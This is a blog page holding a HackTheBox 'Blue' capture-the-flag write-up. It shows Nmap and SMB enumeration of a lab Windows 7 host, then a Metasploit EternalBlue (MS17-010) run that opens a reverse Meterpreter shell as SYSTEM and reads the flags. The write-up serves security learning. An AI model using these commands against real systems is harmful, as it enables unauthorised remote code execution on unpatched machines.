<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB Blue Writeup | Tamago Security</title><meta name="author" content="TamaGorengs"><meta name="copyright" content="TamaGorengs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Blue is a straightforward Windows box on HackTheBox, rated easy, that demonstrates the dangers of unpatched systems. We start with an Nmap scan revealing it’s Windows 7 SP1, vulnerable to EternalBlue">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB Blue Writeup">
<meta property="og:url" content="https://tamagorengs.github.io/2026/02/04/HTB-Blue-Writeup/index.html">
<meta property="og:site_name" content="Tamago Security">
<meta property="og:description" content="Blue is a straightforward Windows box on HackTheBox, rated easy, that demonstrates the dangers of unpatched systems. We start with an Nmap scan revealing it’s Windows 7 SP1, vulnerable to EternalBlue">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://tamagorengs.github.io/2026/02/04/HTB-Blue-Writeup/htb-blue.png">
<meta property="article:published_time" content="2026-02-04T15:22:17.000Z">
<meta property="article:modified_time" content="2026-02-04T15:31:04.978Z">
<meta property="article:author" content="TamaGorengs">
<meta property="article:tag" content="EternalBlue">
<meta property="article:tag" content="HTB">
<meta property="article:tag" content="Windows">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tamagorengs.github.io/2026/02/04/HTB-Blue-Writeup/htb-blue.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HTB Blue Writeup",
  "url": "https://tamagorengs.github.io/2026/02/04/HTB-Blue-Writeup/",
  "image": "https://tamagorengs.github.io/2026/02/04/HTB-Blue-Writeup/htb-blue.png",
  "datePublished": "2026-02-04T15:22:17.000Z",
  "dateModified": "2026-02-04T15:31:04.978Z",
  "author": [
    {
      "@type": "Person",
      "name": "TamaGorengs",
      "url": "https://tamagorengs.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://tamagorengs.github.io/2026/02/04/HTB-Blue-Writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HTB Blue Writeup',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/sukuna.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/mash.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2026/02/04/HTB-Blue-Writeup/htb-blue.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Tamago Security</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB Blue Writeup</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB Blue Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-04T15:22:17.000Z" title="Created 2026-02-04 23:22:17">2026-02-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-04T15:31:04.978Z" title="Updated 2026-02-04 23:31:04">2026-02-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeups/">Writeups</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeups/HackTheBox/">HackTheBox</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Blue is a straightforward Windows box on HackTheBox, rated easy, that demonstrates the dangers of unpatched systems. We start with an Nmap scan revealing it’s Windows 7 SP1, vulnerable to EternalBlue (MS17-010). Using Metasploit’s exploit module, we get a SYSTEM shell immediately and grab both flags. No privesc needed.</p>
<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>I kicked off with a full port Nmap scan, adding version and script scanning to get as much info as possible:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p- -sCV -oN nmap-blue.txt 10.129.194.164 --min-rate 10000</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-04 08:50 -0500</span><br><span class="line">Warning: 10.129.194.164 giving up on port because retransmission <span class="built_in">cap</span> hit (10).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.194.164</span><br><span class="line">Host is up (0.010s latency).</span><br><span class="line">Not shown: 65517 closed tcp ports (reset)</span><br><span class="line">PORT      STATE    SERVICE      VERSION</span><br><span class="line">135/tcp   open     msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open     microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">7802/tcp  filtered vns-tp</span><br><span class="line">9516/tcp  filtered unknown</span><br><span class="line">12689/tcp filtered unknown</span><br><span class="line">16166/tcp filtered unknown</span><br><span class="line">21693/tcp filtered unknown</span><br><span class="line">27945/tcp filtered unknown</span><br><span class="line">30198/tcp filtered unknown</span><br><span class="line">49152/tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">52337/tcp filtered unknown</span><br><span class="line">62111/tcp filtered unknown</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2026-02-04T13:51:23</span><br><span class="line">|_  start_date: 2026-02-04T13:48:30</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: haris-PC</span><br><span class="line">|   NetBIOS computer name: HARIS-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System <span class="keyword">time</span>: 2026-02-04T13:51:26+00:00</span><br><span class="line">|_clock-skew: mean: 3s, deviation: 2s, median: 1s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 84.07 seconds</span><br></pre></td></tr></table></figure>

<p>The scan shows SMB open on 445, and the OS is pinpointed as Windows 7 Professional 7601 SP1. Message signing is off, which is common on older setups but risky.</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>With SMB open, I checked for anonymous access:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -L //10.129.194.164</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\kali]:</span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        Share           Disk      </span><br><span class="line">        Users           Disk      </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.194.164 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

<p>Shares are visible: ADMIN$, C$, IPC$, Share, Users. I connected anonymously as guest to the Users share:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient //10.129.194.164/Users -U guest </span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\guest]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DR        0  Fri Jul 21 02:56:23 2017</span><br><span class="line">  ..                                 DR        0  Fri Jul 21 02:56:23 2017</span><br><span class="line">  Default                           DHR        0  Tue Jul 14 03:07:31 2009</span><br><span class="line">  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009</span><br><span class="line">  Public                             DR        0  Tue Apr 12 03:51:29 2011</span><br><span class="line">                4692735 blocks of size 4096. 657848 blocks available</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> Default</span><br><span class="line">smb: \Default\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                 DHR        0  Tue Jul 14 03:07:31 2009</span><br><span class="line">  ..                                DHR        0  Tue Jul 14 03:07:31 2009</span><br><span class="line">  AppData                           DHn        0  Mon Jul 13 23:20:08 2009</span><br><span class="line">  Desktop                            DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">  Documents                          DR        0  Tue Jul 14 01:08:56 2009</span><br><span class="line">  Downloads                          DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">  Favorites                          DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">  Links                              DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">  Music                              DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">  NTUSER.DAT                       AHSn   262144  Fri Jul 14 18:37:57 2017</span><br><span class="line">  NTUSER.DAT.LOG                     AH     1024  Tue Apr 12 03:54:55 2011</span><br><span class="line">  NTUSER.DAT.LOG1                    AH   189440  Sun Jul 16 16:22:24 2017</span><br><span class="line">  NTUSER.DAT.LOG2                    AH        0  Mon Jul 13 22:34:08 2009</span><br><span class="line">  NTUSER.DAT&#123;016888bd-6c6f-11de-8d1d-001e0bcde3ec&#125;.TM.blf    AHS    65536  Tue Jul 14 00:45:54 2009</span><br><span class="line">  NTUSER.DAT&#123;016888bd-6c6f-11de-8d1d-001e0bcde3ec&#125;.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul 14 00:45:54 2009</span><br><span class="line">  NTUSER.DAT&#123;016888bd-6c6f-11de-8d1d-001e0bcde3ec&#125;.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul 14 00:45:54 2009</span><br><span class="line">  Pictures                           DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">  Saved Games                        Dn        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">  Videos                             DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">                4692735 blocks of size 4096. 657848 blocks available</span><br><span class="line">smb: \Default\&gt; <span class="built_in">cd</span> Desktop</span><br><span class="line">smb: \Default\Desktop\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">  ..                                 DR        0  Mon Jul 13 22:34:59 2009</span><br><span class="line">                4692735 blocks of size 4096. 657848 blocks available</span><br></pre></td></tr></table></figure>

<p>Anonymous access works for the Users share, but there’s nothing interesting—no useful files, credentials, or flags. The Default user’s directories are mostly empty or default Windows stuff.</p>
<p>Googling “Windows 7 Professional 7601 Service Pack 1 vulnerabilities” immediately points to MS17-010, aka EternalBlue. This is a remote code execution vuln in SMBv1, exploited by the NSA and leaked by Shadow Brokers in 2017. It allows unauthenticated RCE by overflowing a buffer in the SMB server, leading to kernel-level code execution.</p>
<img src="/2026/02/04/HTB-Blue-Writeup/google_eternalblue.png" class="">

<p>EternalBlue was weaponized in WannaCry and NotPetya, causing global chaos. Microsoft patched it in March 2017, but this box is unpatched. For more details, check out the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">Microsoft Security Bulletin</a>.</p>
<p>Time to exploit.</p>
<h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>Metasploit has a reliable module for this: <code>exploit/windows/smb/ms17_010_eternalblue</code>. It’s stable and handles the pool grooming and shellcode injection automatically.</p>
<p>Fire up msfconsole:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole -q</span><br><span class="line">msf6 &gt; search eternalblue</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line">   <span class="comment">#   Name                                           Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -   ----                                           ---------------  ----     -----  -----------</span><br><span class="line">   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1     \_ target: Automatic Target                  .                .        .      .</span><br><span class="line">   2     \_ target: Windows 7                         .                .        .      .</span><br><span class="line">   3     \_ target: Windows Embedded Standard 7       .                .        .      .</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhosts 10.129.194.164</span><br><span class="line">rhosts =&gt; 10.129.194.164</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> lhost 10.10.14.109</span><br><span class="line">lhost =&gt; 10.10.14.109</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://0xdfimages.gitlab.io/img/blue-metasploit.png">Metasploit Exploit</a></p>
<p>The module checks for vuln first (using the auxiliary scanner), confirms it’s exploitable, then grooms the pool with SMBv2 packets, creates a hole by closing SMBv1, and sends the exploit payload. Success! We get a Meterpreter session as SYSTEM.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 10.10.14.109:4444 </span><br><span class="line">[*] 10.129.194.164:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.129.194.164:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.129.194.164:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 10.129.194.164:445 - The target is vulnerable.</span><br><span class="line">[*] 10.129.194.164:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 10.129.194.164:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 10.129.194.164:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 10.129.194.164:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.129.194.164:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.129.194.164:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.129.194.164:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.129.194.164:445 - Target <span class="built_in">arch</span> selected valid <span class="keyword">for</span> <span class="built_in">arch</span> indicated by DCE/RPC reply</span><br><span class="line">[*] 10.129.194.164:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.129.194.164:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.129.194.164:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.129.194.164:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.129.194.164:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.129.194.164:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.129.194.164:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.129.194.164:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.129.194.164:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.129.194.164:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.129.194.164:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (232006 bytes) to 10.129.194.164</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.109:4444 -&gt; 10.129.194.164:49158) at 2026-02-04 08:59:09 -0500</span><br><span class="line">[+] 10.129.194.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.129.194.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.129.194.164:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<h2 id="Capture-the-Flags"><a href="#Capture-the-Flags" class="headerlink" title="Capture the Flags"></a>Capture the Flags</h2><p>With SYSTEM access, flags are easy:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">cat</span> <span class="string">&quot;C:\Users\haris\Desktop\user.txt&quot;</span></span><br><span class="line">ccd9d8c4d096f50e01cd926cb66d44cf</span><br><span class="line">meterpreter &gt; <span class="built_in">cat</span> <span class="string">&quot;C:\Users\Administrator\Desktop\root.txt&quot;</span></span><br><span class="line">db6baa3a87f9944ffa56a121594c98e1</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://0xdfimages.gitlab.io/img/blue-flags.png">Flags</a></p>
<h2 id="Beyond-Root"><a href="#Beyond-Root" class="headerlink" title="Beyond Root"></a>Beyond Root</h2><p>Blue is a classic for teaching about EternalBlue. In real-world scenarios, patch your systems! If you want a challenge, try exploiting manually with Python scripts like those from <a target="_blank" rel="noopener" href="https://github.com/worawit/MS17-010">worawit&#x2F;MS17-010</a>. No privesc here since we land as SYSTEM, but always check for other vulns.</p>
<p>That’s Blue pwned. On to the next!</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://tamagorengs.github.io">TamaGorengs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://tamagorengs.github.io/2026/02/04/HTB-Blue-Writeup/">https://tamagorengs.github.io/2026/02/04/HTB-Blue-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/EternalBlue/">EternalBlue</a></div><div class="post-share"><div class="social-share" data-image="/2026/02/04/HTB-Blue-Writeup/htb-blue.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/04/Hello-World-Why-Tamago-Security/" title="Hello World: Why Tamago Security?"><img class="cover" src="/img/guts.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Hello World: Why Tamago Security?</div></div><div class="info-2"><div class="info-item-1">“1% better everyday.” That’s the core philosophy behind Tamago Security. Hi, I’m TamaGorengs. 